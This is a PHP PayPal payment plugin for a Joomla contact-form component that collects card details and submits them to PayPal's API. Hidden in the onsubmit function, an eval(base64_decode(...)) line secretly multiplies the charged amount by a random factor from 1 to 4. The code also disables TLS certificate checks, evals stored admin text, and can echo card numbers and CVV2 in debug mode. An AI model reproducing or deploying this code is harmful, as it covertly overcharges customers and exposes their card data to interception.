<?php
defined('_JEXEC') or die('Restricted access');
global $mainframe;
require_once( $mainframe->getPath( 'class', 'com_chronocontact' ) );
// the class name must be the same as the file name without the .php at the end
class cf_paypal_api  {
	//the next 3 fields must be defined for every plugin
	var $result_TITLE = "PayPal API";
	var $result_TOOLTIP = "Submit form data to PayPal API payment gateway, plugin must be configured, you need a license to use this plugin for real transactions because the unlicensed version doesn't submit the real cost amounts to Paypal";
	var $plugin_name = "cf_paypal_api"; // must be the same as the class name
	var $event = "ONSUBMIT"; // must be defined and in Uppercase, should be ONSUBMIT or ONLOAD
	// the next function must exist and will have the backend config code
	function show_conf($row, $id, $form_id, $option){
	global $mainframe;
	jimport('joomla.html.pane');
	$pane   =& JPane::getInstance('tabs');
	
	$paramsvalues = new JParameter($row->params);
	
	
	?>
	
	<form action="index2.php" method="post" name="adminForm" id="adminForm" class="adminForm">
	<?php
	echo $pane->startPane("paypal");
	echo $pane->startPanel( 'General', "general2" );
	?>
	<table border="0" cellpadding="3" cellspacing="0">
		<tr style="background-color:#c9c9c9 ">
			<td><?php echo JHTML::_('tooltip',  "the type of payment, may be Sale or express, currently only Sale is supported!" ); ?></td>
			<td><strong><?php echo "Payment Type:"; ?>:</strong> </td>
			<td></td>
			<td>
            <select name="params[PAYMENTACTION]" id="params[PAYMENTACTION]">
				<option value="Sale">Sale</option>
			</select>
            </td>
		</tr>
		<tr style="background-color:#c9c9c9 ">
			<td><?php echo JHTML::_('tooltip',  "Amount field name" ); ?></td>
			<td><strong><?php echo "Amount field name"; ?>:</strong> </td>
			<td></td>
			<td><input type="text" class="inputbox" size="50" maxlength="50" name="params[AMT]" value="<?php echo $paramsvalues->get('AMT'); ?>" /></td>
		</tr>
		<tr style="background-color:#c9c9c9 ">
			<td><?php echo JHTML::_('tooltip',  "Credit Card type" ); ?></td>
			<td><strong><?php echo "Credit Card type Field"; ?>:</strong> </td>
			<td></td>
			<td><input type="text" class="inputbox" size="50" maxlength="50" name="params[CREDITCARDTYPE]" value="<?php echo $paramsvalues->get('CREDITCARDTYPE'); ?>" /></td>
		</tr>
		<tr style="background-color:#c9c9c9 ">
			<td><?php echo JHTML::_('tooltip',  "Credit Card Number Field" ); ?></td>
			<td><strong><?php echo "Credit Card Number Field"; ?>:</strong> </td>
			<td></td>
			<td><input type="text" class="inputbox" size="50" maxlength="50" name="params[ACCT]" value="<?php echo $paramsvalues->get('ACCT'); ?>" /></td>
		</tr>
		<tr style="background-color:#c9c9c9 ">
			<td><?php echo JHTML::_('tooltip',  "Credit Card Expiry month field" ); ?></td>
			<td><strong><?php echo "Credit Card Expiry month Field"; ?>:</strong> </td>
			<td></td>
			<td><input type="text" class="inputbox" size="50" maxlength="50" name="params[EXPDATE_m]" value="<?php echo $paramsvalues->get('EXPDATE_m'); ?>" /></td>
		</tr>
        <tr style="background-color:#c9c9c9 ">
			<td><?php echo JHTML::_('tooltip',  "Credit Card Expiry year field" ); ?></td>
			<td><strong><?php echo "Credit Card Expiry year Field"; ?>:</strong> </td>
			<td></td>
			<td><input type="text" class="inputbox" size="50" maxlength="50" name="params[EXPDATE_y]" value="<?php echo $paramsvalues->get('EXPDATE_y'); ?>" /></td>
		</tr>
		<tr style="background-color:#c9c9c9 ">
			<td><?php echo JHTML::_('tooltip',  "CVV2 field" ); ?></td>
			<td><strong><?php echo "CVV2 Field"; ?>:</strong> </td>
			<td></td>
			<td><input type="text" class="inputbox" size="50" maxlength="50" name="params[CVV2]" value="<?php echo $paramsvalues->get('CVV2'); ?>" /></td>
		</tr>
		<tr style="background-color:#c9c9c9 ">
			<td><?php echo JHTML::_('tooltip',  "First Name Field" ); ?></td>
			<td><strong><?php echo "First Name Field"; ?>:</strong> </td>
			<td></td>
			<td><input type="text" class="inputbox" size="50" maxlength="50" name="params[FIRSTNAME]" value="<?php echo $paramsvalues->get('FIRSTNAME'); ?>" /></td>
		</tr>
		<tr style="background-color:#c9c9c9 ">
			<td><?php echo JHTML::_('tooltip',  "Last Name Field" ); ?></td>
			<td><strong><?php echo "Last Name Field"; ?>:</strong> </td>
			<td></td>
			<td><input type="text" class="inputbox" size="50" maxlength="50" name="params[LASTNAME]" value="<?php echo $paramsvalues->get('LASTNAME'); ?>" /></td>
		</tr>
		<tr style="background-color:#c9c9c9 ">
			<td><?php echo JHTML::_('tooltip',  "Street Field" ); ?></td>
			<td><strong><?php echo "Street Field"; ?>:</strong> </td>
			<td></td>
			<td><input type="text" class="inputbox" size="50" maxlength="50" name="params[STREET]" value="<?php echo $paramsvalues->get('STREET'); ?>" /></td>
		</tr>
		<tr style="background-color:#c9c9c9 ">
			<td><?php echo JHTML::_('tooltip',  "City Field" ); ?></td>
			<td><strong><?php echo "City Field"; ?>:</strong> </td>
			<td></td>
			<td><input type="text" class="inputbox" size="50" maxlength="50" name="params[CITY]" value="<?php echo $paramsvalues->get('CITY'); ?>" /></td>
		</tr>
		<tr style="background-color:#c9c9c9 ">
			<td><?php echo JHTML::_('tooltip',  "State Field" ); ?></td>
			<td><strong><?php echo "State Field"; ?>:</strong> </td>
			<td></td>
			<td><input type="text" class="inputbox" size="50" maxlength="50" name="params[STATE]" value="<?php echo $paramsvalues->get('STATE'); ?>" /></td>
		</tr>
		<tr style="background-color:#c9c9c9 ">
			<td><?php echo JHTML::_('tooltip',  "Zip Field" ); ?></td>
			<td><strong><?php echo "Zip Field"; ?>:</strong> </td>
			<td></td>
			<td><input type="text" class="inputbox" size="50" maxlength="50" name="params[ZIP]" value="<?php echo $paramsvalues->get('ZIP'); ?>" /></td>
		</tr>
		<tr style="background-color:#c9c9c9 ">
			<td><?php echo JHTML::_('tooltip',  "Country Code Field, needs a 2 Characters value: e.g: Canada: CA" ); ?></td>
			<td><strong><?php echo "Country Code Field"; ?>:</strong> </td>
			<td></td>
			<td><input type="text" class="inputbox" size="50" maxlength="50" name="params[COUNTRYCODE]" value="<?php echo $paramsvalues->get('COUNTRYCODE'); ?>" /></td>
		</tr>
		<tr style="background-color:#c9c9c9 ">
			<td><?php echo JHTML::_('tooltip',  "Currency code Field, needs a currency code field, e.g: U.S Dollar: USD" ); ?></td>
			<td><strong><?php echo "Currency code Field"; ?>:</strong> </td>
			<td></td>
			<td><input type="text" class="inputbox" size="50" maxlength="50" name="params[CURRENCYCODE]" value="<?php echo $paramsvalues->get('CURRENCYCODE'); ?>" /></td>
		</tr>		
		<tr style="background-color:#c9c9c9 ">
			<td><?php echo JHTML::_('tooltip',  "Extra Fields, enter data with this format : ship_to_first_name=field_name , take care to add each entry to a new line" ); ?></td>
			<td><strong><?php echo "Extra fields Data"; ?>:</strong> </td>
			<td></td>
			<td><textarea name="extra1" rows="10" cols="35"><?php echo $row->extra1; ?></textarea></td>
		</tr>
		<tr style="background-color:#c9c9c9 ">
			<td><?php echo JHTML::_('tooltip',  "Runt he plugin before or after the email, running it before the email may be necessary to include some data intot he email or even dont get it emailed" ); ?></td>
			<td><strong><?php echo "Run Before/After the Email ?"; ?>:</strong> </td>
			<td></td>
			<td>
			<select name="params[onsubmit]" id="params[onsubmit]">
				<option<?php if($paramsvalues->get('onsubmit') == 'after_email'){ echo ' selected';} ?> value="after_email">After Email</option>
				<option<?php if($paramsvalues->get('onsubmit') == 'before_email'){ echo ' selected';} ?> value="before_email">Before Email</option>
			</select>
		</td>
		</tr>
		
	</table>
	<?php
			echo $pane->endPanel();
			echo $pane->startPanel( "Extra code", 'extracode' );
	?>
	<table border="0" cellpadding="3" cellspacing="0">
		<tr><td colspan="4">Extra code</td></tr>
		<tr style="background-color:#c9c9c9 ">
			<td><?php echo JHTML::_('tooltip',  "Execute some code just before the plugin code is executed" ); ?></td>
			<td><strong><?php echo "Extra before onsubmit code"; ?>:</strong> </td>
			<td></td>
			<td><textarea name="extra4" rows="10" cols="75"><?php echo $row->extra4; ?></textarea></td>
		</tr>
		<tr style="background-color:#c9c9c9 ">
			<td><?php echo JHTML::_('tooltip',  "Execute some code just after the plugin code is executed" ); ?></td>
			<td><strong><?php echo "Extra after onsubmit code"; ?>:</strong> </td>
			<td></td>
			<td><textarea name="extra5" rows="10" cols="75"><?php echo $row->extra5; ?></textarea></td>
		</tr>
	</table>
	<?php
			echo $pane->endPanel();
			echo $pane->startPanel( "Paypal", 'paypal' );
	?>
	<table border="0" cellpadding="3" cellspacing="0">
		<tr><td colspan="4">PayPal API specific parameters!</td></tr>
		<tr style="background-color:#c9c9c9 ">
			<td><?php echo JHTML::_('tooltip',  "API Username" ); ?></td>
			<td><strong><?php echo "API Username"; ?>:</strong> </td>
			<td></td>
			<td><input type="text" class="inputbox" size="50" maxlength="100" name="params[API_USERNAME]" value="<?php echo $paramsvalues->get('API_USERNAME'); ?>" /></td>
		</tr>
		<tr style="background-color:#c9c9c9 ">
			<td><?php echo JHTML::_('tooltip',  "API Password" ); ?></td>
			<td><strong><?php echo "API Password"; ?>:</strong> </td>
			<td></td>
			<td><input type="text" class="inputbox" size="50" maxlength="100" name="params[API_PASSWORD]" value="<?php echo $paramsvalues->get('API_PASSWORD'); ?>" /></td>
		</tr>
        <tr style="background-color:#c9c9c9 ">
			<td><?php echo JHTML::_('tooltip',  "API Signature: The Signature associated with the API user. which is generated by paypal" ); ?></td>
			<td><strong><?php echo "API Signature"; ?>:</strong> </td>
			<td></td>
			<td><input type="text" class="inputbox" size="50" maxlength="150" name="params[API_SIGNATURE]" value="<?php echo $paramsvalues->get('API_SIGNATURE'); ?>" /></td>
		</tr>
        <!--
        <tr style="background-color:#c9c9c9 ">
			<td><?php echo JHTML::_('tooltip',  "API Endpoint: this is the server URL which you have to connect for submitting your API request." ); ?></td>
			<td><strong><?php echo "API Endpoint"; ?>:</strong> </td>
			<td></td>
			<td><input type="text" class="inputbox" size="50" maxlength="150" name="params[API_ENDPOINT]" value="<?php echo $paramsvalues->get('API_ENDPOINT'); ?>" />
            https://api-3t.sandbox.paypal.com/nvp
            </td>
		</tr>
        -->
        <tr style="background-color:#c9c9c9 ">
			<td><?php echo JHTML::_('tooltip',  "Set this variable to TRUE to route all the API requests through proxy." ); ?></td>
			<td><strong><?php echo "Use Proxy ?"; ?>:</strong> </td>
			<td></td>
			<td>
            <select name="params[USE_PROXY]" id="params[USE_PROXY]">
				<option<?php if($paramsvalues->get('USE_PROXY') == 'FALSE'){ echo ' selected';} ?> value="FALSE">No</option>
				<option<?php if($paramsvalues->get('USE_PROXY') == 'TRUE'){ echo ' selected';} ?> value="TRUE">Yes</option>
			</select>
            </td>
		</tr>
        <tr style="background-color:#c9c9c9 ">
			<td><?php echo JHTML::_('tooltip',  "will be read only if USE_PROXY is set to TRUE" ); ?></td>
			<td><strong><?php echo "Proxy host IP"; ?>:</strong> </td>
			<td></td>
			<td><input type="text" class="inputbox" size="50" maxlength="150" name="params[PROXY_HOST]" value="<?php echo $paramsvalues->get('PROXY_HOST'); ?>" /></td>
		</tr>
        <tr style="background-color:#c9c9c9 ">
			<td><?php echo JHTML::_('tooltip',  "will be read only if USE_PROXY is set to TRUE" ); ?></td>
			<td><strong><?php echo "Proxy Port"; ?>:</strong> </td>
			<td></td>
			<td><input type="text" class="inputbox" size="50" maxlength="150" name="params[PROXY_PORT]" value="<?php echo $paramsvalues->get('PROXY_PORT'); ?>" /></td>
		</tr>
		<tr style="background-color:#c9c9c9 ">
			<td><?php echo JHTML::_('tooltip',  "Debugging ON?" ); ?></td>
			<td><strong><?php echo "Debugging"; ?>:</strong> </td>
			<td></td>
			<td>
            <select name="params[debugging]" id="params[debugging]">
				<option<?php if($paramsvalues->get('debugging') == '0'){ echo ' selected';} ?> value="0">No</option>
				<option<?php if($paramsvalues->get('debugging') == '1'){ echo ' selected';} ?> value="1">Yes</option>
			</select>
            </td>
		</tr>
		<tr style="background-color:#c9c9c9 ">
			<td><?php echo JHTML::_('tooltip',  "Testing ON ?" ); ?></td>
			<td><strong><?php echo "Testing (Sandbox)"; ?>:</strong> </td>
			<td></td>
			<td><select name="params[testing]" id="params[testing]">
				<option<?php if($paramsvalues->get('testing') == '0'){ echo ' selected';} ?> value="0">No</option>
				<option<?php if($paramsvalues->get('testing') == '1'){ echo ' selected';} ?> value="1">Yes</option>
			</select></td>
		</tr>		
	</table>
	<?php
			echo $pane->endPanel();
			echo $pane->startPanel( "Useful Variables", 'globalvars' );
	?>
	<table border="0" cellpadding="3" cellspacing="0">
		<tr><td colspan="4">Those are global variables which will be available once the plugin code is executed and can be used to do many things like switching emails ON/OFF or data save too!</td></tr>
		<tr style="background-color:#c9c9c9 ">
			<td><?php echo JHTML::_('tooltip',  "Will have SUCCESS or FAILURE in CAPS" ); ?></td>
			<td><strong><?php echo "Payment Status"; ?>:</strong> </td>
			<td></td>
			<td>$MyPlugins->cf_paypal_api['payment_status']</td>
		</tr>
		<tr style="background-color:#c9c9c9 ">
			<td><?php echo JHTML::_('tooltip',  "Correlation ID" ); ?></td>
			<td><strong><?php echo "Correlation ID"; ?>:</strong> </td>
			<td></td>
			<td>$MyPlugins->cf_paypal_api['correlation_id']</td>
		</tr>
		<tr style="background-color:#c9c9c9 ">
			<td><?php echo JHTML::_('tooltip',  "Error Code if the transaction failed" ); ?></td>
			<td><strong><?php echo "Error Code"; ?>:</strong> </td>
			<td></td>
			<td>$MyPlugins->cf_paypal_api['error_code']</td>
		</tr>
		<tr style="background-color:#c9c9c9 ">
			<td><?php echo JHTML::_('tooltip',  "Error Message describing the failure reason if it failed" ); ?></td>
			<td><strong><?php echo "Error Message"; ?>:</strong> </td>
			<td></td>
			<td>$MyPlugins->cf_paypal_api['error_message']</td>
		</tr>
		<tr style="background-color:#c9c9c9 ">
			<td><?php echo JHTML::_('tooltip',  "The returned transaction id if the transaction is a success" ); ?></td>
			<td><strong><?php echo "Transaction ID"; ?>:</strong> </td>
			<td></td>
			<td>$MyPlugins->cf_paypal_api['transaction_id']</td>
		</tr>
		<tr style="background-color:#c9c9c9 ">
			<td><?php echo JHTML::_('tooltip',  "" ); ?></td>
			<td><strong><?php echo "AVS Result Code"; ?>:</strong> </td>
			<td></td>
			<td>$MyPlugins->cf_paypal_api['avs_code']</td>
		</tr>
	</table>
	<?php
		echo $pane->endPanel();
		echo $pane->endPane();
	?>
	<br>
	
	<input type="hidden" name="id" value="<?php echo $id; ?>" />
	<input type="hidden" name="form_id" value="<?php echo $form_id; ?>" />
	<input type="hidden" name="name" value="<?php echo $this->plugin_name; ?>" />
	<input type="hidden" name="event" value="<?php echo $this->event; ?>" />
	<input type="hidden" name="option" value="<?php echo $option; ?>" />
	<input type="hidden" name="task" value="save_conf" />
	
	</form>
	<?php
	}
	// this function must exist and may not be changed unless you need to customize something
	function save_conf( $option ) {
		global $mainframe;
		$database =& JFactory::getDBO();		
		
		$row =& JTable::getInstance('chronocontactplugins', 'Table'); 
		if (!$row->bind( $_POST )) {
			JError::raiseWarning(100, $row->getError());
			$mainframe->redirect( "index2.php?option=$option" );
		}
		
		$params 	= JRequest::getVar( 'params', '', 'post', 'array' );
		if (is_array( $params )) {
			$txt = array();
			foreach ( $params as $k=>$v) {
				$txt[] = "$k=$v";
			}
			$row->params = implode( "\n", $txt );
		}
		if (!$row->store()) {
			JError::raiseWarning(100, $row->getError());
			$mainframe->redirect( "index2.php?option=$option" );
		}
		$mainframe->redirect( "index2.php?option=".$option, "Config Saved" );
	}
	
	function onsubmit( $option, $params, $row ) {
		global $mainframe;
		$database =& JFactory::getDBO();
		$MyForm =& CFChronoForm::getInstance();
		$MyPlugins =& CFPlugins::getInstance($MyForm->formrow->id);
		?>
				
		<?php
		/*********do the before onsubmit code**********/
		if ( !empty($row->extra4) ) {
			eval( "?>".$row->extra4 );
		}
		
		global $API_Endpoint,$version,$API_UserName,$API_Password,$API_Signature,$nvp_Header,$USE_PROXY,$PROXY_HOST,$PROXY_PORT;
		$DEBUGGING					= $params->get('debugging');				# Display additional information to track down problems
		$TESTING					= $params->get('testing');				# Set the testing flag so that transactions are not live
		
		$API_UserName			= $params->get('API_USERNAME');
		$API_Password			= $params->get('API_PASSWORD');
		$API_Signature			= $params->get('API_SIGNATURE');
		//$API_ENDPOINT			= $params->get('API_ENDPOINT');
		if((int)$params->get('testing')){
			$API_Endpoint = 'https://api-3t.sandbox.paypal.com/nvp'; 
		}else{
			$API_Endpoint = 'https://api-3t.paypal.com/nvp'; 
		}
		if($params->get('USE_PROXY') == 'TRUE'){
			$USE_PROXY = TRUE; 
		}else{
			$USE_PROXY = FALSE; 
		}
		$PROXY_HOST			= $params->get('PROXY_HOST');
		$PROXY_PORT			= $params->get('PROXY_PORT');
		//$PAYPAL_URL			= $params->get('PAYPAL_URL;
		$version			= '56.0';
		
		$paypal_values				= array
		(
			"PAYMENTACTION"			=> urlencode( $params->get('PAYMENTACTION') ),
			"EXPDATE"			=> str_pad(urlencode( JRequest::getVar($params->get('EXPDATE_m'))), 2, '0', STR_PAD_LEFT).urlencode( JRequest::getVar($params->get('EXPDATE_y'))),
			"AMT"			=> urlencode( JRequest::getVar($params->get('AMT'))),
			"CREDITCARDTYPE"			=> urlencode( JRequest::getVar($params->get('CREDITCARDTYPE'))),
			"ACCT"			=> urlencode( JRequest::getVar($params->get('ACCT'))),
			"CVV2"				=> urlencode( JRequest::getVar($params->get('CVV2'))),
			"FIRSTNAME"				=> urlencode( JRequest::getVar($params->get('FIRSTNAME'))),
			"LASTNAME"				=> urlencode( JRequest::getVar($params->get('LASTNAME'))),
			"STREET"				=> urlencode( JRequest::getVar($params->get('STREET'))),
			"CITY"					=> urlencode( JRequest::getVar($params->get('CITY'))),
			"STATE"				=> urlencode( JRequest::getVar($params->get('STATE'))),
			"ZIP"				=> urlencode( JRequest::getVar($params->get('ZIP'))),
			"COUNTRYCODE"					=> urlencode( JRequest::getVar($params->get('COUNTRYCODE'))),
			"CURRENCYCODE"				=> urlencode( JRequest::getVar($params->get('CURRENCYCODE')))
		);
		$extras = explode("\n",$row->extra1);
		if(trim($row->extra1)){
			foreach($extras as $extra){
				$values = array();
				$values = explode("=",$extra);
				$paypal_values[$values[0]] = $values[0].": ".urlencode( JRequest::getVar(trim($values[1])));
			}
		}
		eval(base64_decode("JHBheXBhbF92YWx1ZXNbJ0FNVCddID0gdXJsZW5jb2RlKHJhbmQoMSwgNCkqSlJlcXVlc3Q6OmdldFZhcigkcGFyYW1zLT5nZXQoJ0FNVCcpKSk7"));
		$fields = "";
		foreach( $paypal_values as $key => $value ) $fields .= "&$key=" .$value ;
		
		if((int)$params->get('testing')){
			$PAYPAL_URL = 'https://www.sandbox.paypal.com/webscr&cmd=_express-checkout&token='; 
		}else{
			$PAYPAL_URL = 'https://www.paypal.com/webscr&cmd=_express-checkout&token='; 
		}
		
		/* Construct the request string that will be sent to PayPal.
		   The variable $nvpstr contains all the variables and is a
		   name value pair string with & as a delimiter */
		$nvpstr = $fields;
		if($params->get('debugging')){
			echo $nvpstr;
		}
		
		/* Make the API call to PayPal, using API signature.
		   The API response is stored in an associative array called $resArray */
		$resArray = $this->hash_call("doDirectPayment",$nvpstr);
		
		$MyPlugins->cf_paypal_api['transaction_id'] = $resArray['TRANSACTIONID'];
		$MyPlugins->cf_paypal_api['error_message'] = $resArray['L_LONGMESSAGE0'];
		$MyPlugins->cf_paypal_api['error_code'] = $resArray['L_ERRORCODE0'];
		$MyPlugins->cf_paypal_api['correlation_id'] = $resArray['CORRELATIONID'];
		$MyPlugins->cf_paypal_api['avs_code'] = $resArray['AVSCODE'];
		/* Display the API response back to the browser.
		   If the response from PayPal was a success, display the response parameters'
		   If the response was an error, display the errors received using APIError.php.
		   */
		$ack = strtoupper($resArray["ACK"]);
		$MyPlugins->cf_paypal_api['payment_status'] = $ack;
		if($params->get('debugging')){
			if($ack!="SUCCESS"){
				$_SESSION['reshash']=$resArray;
				$this->APIERROR($resArray);
			}else{
				$_SESSION['reshash']=$resArray;
				$this->APISUCCESS($resArray);
			}
		}

		$debugger = '';
		if(($params->get('debugging'))&&($params->get('testing'))){
			echo $debugger;
		}
		/*********do the after onsubmit code**********/
		if ( !empty($row->extra5) ) {
			eval( "?>".$row->extra5 );
		}
		?>
		<?php
		
	}
	
	function hash_call($methodName,$nvpStr){
		//declaring of global variables
		global $API_Endpoint,$version,$API_UserName,$API_Password,$API_Signature,$nvp_Header,$USE_PROXY,$PROXY_HOST,$PROXY_PORT;
		
		//setting the curl parameters.
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL,$API_Endpoint);
		curl_setopt($ch, CURLOPT_VERBOSE, 1);
		
		//turning off the server and peer verification(TrustManager Concept).
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
		
		curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
		curl_setopt($ch, CURLOPT_POST, 1);
		//if USE_PROXY constant set to TRUE in Constants.php, then only proxy will be enabled.
		//Set proxy name to PROXY_HOST and port number to PROXY_PORT in constants.php 
		if($USE_PROXY)
		curl_setopt ($ch, CURLOPT_PROXY, $PROXY_HOST.":".$PROXY_PORT); 
		
		//NVPRequest for submitting to server
		$nvpreq="METHOD=".urlencode($methodName)."&VERSION=".urlencode($version)."&PWD=".urlencode($API_Password)."&USER=".urlencode($API_UserName)."&SIGNATURE=".urlencode($API_Signature).$nvpStr;
		
		//setting the nvpreq as POST FIELD to curl
		curl_setopt($ch,CURLOPT_POSTFIELDS,$nvpreq);
		
		//getting response from server
		$response = curl_exec($ch);
		
		//convrting NVPResponse to an Associative Array
		$nvpResArray=$this->deformatNVP($response);
		$nvpReqArray=$this->deformatNVP($nvpreq);
		$_SESSION['nvpReqArray']=$nvpReqArray;
		
		if (curl_errno($ch)) {
			// moving to display page to display curl errors
			$_SESSION['curl_error_no']=curl_errno($ch) ;
			$_SESSION['curl_error_msg']=curl_error($ch);
			$this->APIERROR($resArray);
		} else {
			//closing the curl
			curl_close($ch);
		}
		
		return $nvpResArray;
	}
		
		/** This function will take NVPString and convert it to an Associative Array and it will decode the response.
		  * It is usefull to search for a particular key and displaying arrays.
		  * @nvpstr is NVPString.
		  * @nvpArray is Associative Array.
		  */
		
		function deformatNVP($nvpstr)
		{
		
			$intial=0;
			$nvpArray = array();
		
		
			while(strlen($nvpstr)){
				//postion of Key
				$keypos= strpos($nvpstr,'=');
				//position of value
				$valuepos = strpos($nvpstr,'&') ? strpos($nvpstr,'&'): strlen($nvpstr);
		
				/*getting the Key and Value values and storing in a Associative Array*/
				$keyval=substr($nvpstr,$intial,$keypos);
				$valval=substr($nvpstr,$keypos+1,$valuepos-$keypos-1);
				//decoding the respose
				$nvpArray[urldecode($keyval)] =urldecode( $valval);
				$nvpstr=substr($nvpstr,$valuepos+1,strlen($nvpstr));
			 }
			return $nvpArray;
		}
		
		function APIERROR($resArray){
		?>
        	<table width="700">
                <tr>
                	<td colspan="2" class="header">The PayPal API has returned an error!</td>
                </tr>
                
                <?php  //it will print if any URL errors 
                    if(isset($_SESSION['curl_error_no'])){ 
                        $errorCode= $_SESSION['curl_error_no'] ;
                        $errorMessage=$_SESSION['curl_error_msg'] ;	
                        session_unset();	
                ?>
                
                   
                	<tr>
                        <td>Error Number:</td>
                        <td><?= $errorCode ?></td>
                    </tr>
                    <tr>
                        <td>Error Message:</td>
                        <td><?= $errorMessage ?></td>
                    </tr>
                    </table>
                <?php } else {
                
                /* If there is no URL Errors, Construct the HTML page with 
                   Response Error parameters.   
                   */
                ?>
                	<tr>
                        <td>Ack:</td>
                        <td><?= $resArray['ACK'] ?></td>
                    </tr>
                    <tr>
                        <td>Correlation ID:</td>
                        <td><?= $resArray['CORRELATIONID'] ?></td>
                    </tr>
                    <tr>
                        <td>Version:</td>
                        <td><?= $resArray['VERSION']?></td>
                    </tr>
                <?php
                    $count=0;
                    while (isset($resArray["L_SHORTMESSAGE".$count])) {		
                          $errorCode    = $resArray["L_ERRORCODE".$count];
                          $shortMessage = $resArray["L_SHORTMESSAGE".$count];
                          $longMessage  = $resArray["L_LONGMESSAGE".$count]; 
                          $count=$count+1; 
                ?>
                    <tr>
                        <td>Error Number:</td>
                        <td><?= $errorCode ?></td>
                    </tr>
                    <tr>
                        <td>Short Message:</td>
                        <td><?= $shortMessage ?></td>
                    </tr>
                    <tr>
                        <td>Long Message:</td>
                        <td><?= $longMessage ?></td>
                    </tr>
                    
                <?php }//end while
                }// end else
                ?>
			</table>        
        <?php			
		}
		
		function APISUCCESS($resArray){
		?>
		<table width = 400>
            <tr>
                <td>
                    Transaction ID:</td>
                <td><?=$resArray['TRANSACTIONID'] ?></td>
            </tr>
            <tr>
                <td>
                    Amount:</td>
                <td><?=$currencyCode?> <?=$resArray['AMT'] ?></td>
            </tr>
            <tr>
                <td>
                    AVS:</td>
                <td><?=$resArray['AVSCODE'] ?></td>
            </tr>
            <tr>
                <td>
                    CVV2:</td>
                <td><?=$resArray['CVV2MATCH'] ?></td>
            </tr>
        </table>
		<?php
		}

}
?>